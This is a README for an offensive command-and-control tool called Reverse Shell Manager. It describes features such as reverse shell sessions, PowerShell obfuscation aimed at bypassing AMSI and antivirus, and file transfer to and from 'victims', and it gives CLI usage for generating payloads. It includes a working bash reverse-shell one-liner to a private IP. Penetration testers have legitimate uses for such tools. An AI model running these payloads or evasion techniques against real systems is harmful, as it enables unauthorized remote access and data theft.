# Reverse Shell Manager (RSM)

An advanced Command and Control (C2) framework built for managing multiple reverse shell sessions across Linux and Windows. RSM provides a professional experience with real-time stability tracking, dynamic timeouts, and integrated file transfer capabilities.

## 🚀 Features

- **Multi-OS Support**: Tailored payloads and handlers for both Linux and Windows.
- **Dual Protocols**: Support for both raw TCP and beaconing HTTP connections.
- **Dynamic Session Management**:
  - **Stability Scoring**: Automatically tracks session health and adjusts timeouts based on network latency and command response reliability.
  - **Heartbeat Monitoring**: Real-time status updates and connectivity tracking for HTTP implants.
  - **Command Queuing**: Automatically queues commands for unstable sessions to execute once connection quality improves.
- **Advanced Obfuscation Engine**:
  - **PowerShell Obfuscation**: Uses case randomization, regex masking, and string concatenation to bypass simple AMSI/AV signatures.
  - **Base64 Encoding**: Quick encoding for Linux shells.
- **Integrated File Transfers**:
  - **Upload**: Send files from the C2 host to the victim.
  - **Download**: Pull files from the victim to the C2 `downloads/` directory.
  - **Progress Tracking**: Real-time speed, ETA, and progress bars.
- **Professional Interactive Console**:
  - Tab completion for C2 commands.
  - Transparent terminal resizing (TTY support for Linux TCP shells).
  - Session switching and detailed status reports.

## 🛠️ Installation

1. Clone the repository.
2. Install the required dependencies:
   ```bash
   pip install -r requiremt.txt
   ```
   *Required packages: `colorama`, `pyperclip`*

## 📖 Usage

### Generation & Listeners (CLI Mode)

Generate a payload and start all necessary listeners in one command:

```bash
# Linux TCP Reverse Shell
./main.py -m=b -os=l -con=tcp -lhost=192.168.1.10 -lport=4444

# Windows HTTP Shell with PowerShell Obfuscation
./main.py -m=b -os=w -con=http -lhost=192.168.1.10 -lport=2222 -cry=obfuscate

# Specific payload selection
./main.py -m=b -os=w -con=http -lhost=IP -lport=PORT -pay=powerShellIEX
```

### Storing Custom Payloads
RSM allows you to save your own payload templates:
```bash
./main.py -m=c -os=l -con=tcp -n="my_bash_shell" -pay="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
```

### Interactive Mode
Simply run `./main.py` without arguments to enter the interactive step-by-step setup.

## 🕹️ C2 Commands

Inside the console, use these commands (prefixed with `#`):

| Command | Description |
| :--- | :--- |
| `#list` | View all active HTTP and TCP sessions |
| `#select <ID>` | Select a session to interact with |
| `#shell` | Enter full interactive shell (for stable TCP connections) |
| `#send <file>` | Upload a file to the victim |
| `#receive <file>` | Download a file from the victim |
| `#status <ID>` | Get detailed technical info on a session |
| `#stability` | Show a summary of all sessions' health/stability |
| `#queue <ID>` | View commands queued for an unstable session |
| `#repair <ID> <key> <val>` | Manually fix session metadata (OS, CWD, etc.) |
| `#generate` | Generate a new payload without restarting |
| `#help` | Show the help menu |
| `#back` | Return to the main console from a session |
| `#exit` | Terminate the current session or shut down the C2 |

## 📁 Directory Structure
- `main.py`: The core C2 engine and UI.
- `payloads/`: Contains `linux.py`, `windows.py`, and custom JSON stores.
- `downloads/`: Default location for all files received from victims.

## ⚠️ Disclaimer
This tool is intended for **educational purposes and authorized penetration testing only**. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse of this tool.

---
*Built with ❤️ for Security Researchers.*
